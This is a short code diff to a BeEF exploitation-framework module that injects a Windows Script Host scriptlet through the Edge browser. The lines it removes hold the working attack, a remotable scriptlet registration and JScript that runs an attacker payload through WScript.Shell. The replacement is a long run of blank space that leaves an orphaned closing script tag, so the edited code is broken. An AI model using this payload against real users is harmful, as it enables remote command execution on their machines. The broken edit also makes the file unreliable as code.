@@ -16,19 +16,7 @@ class Edge_wscript_wsh_injection < BeEF::Core::Command
       <?XML version="1.0"?>#{'                                                                                           '}
         <scriptlet>
 
-        <registration
-          description="#{rand_str}"
-          progid="#{rand_str}"
-          version="1.00"
-          classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
-          remotable="true"
-        >
-        </registration>
-
-        <script language="JScript">
-        <![CDATA[
-          var r = new ActiveXObject("WScript.Shell").Run("#{payload.gsub('"', '\\"')}");
-        ]]>
+                                                                                                                                                                                                                                                                                                                                                                                                                 
         </script>
 
         </scriptlet>
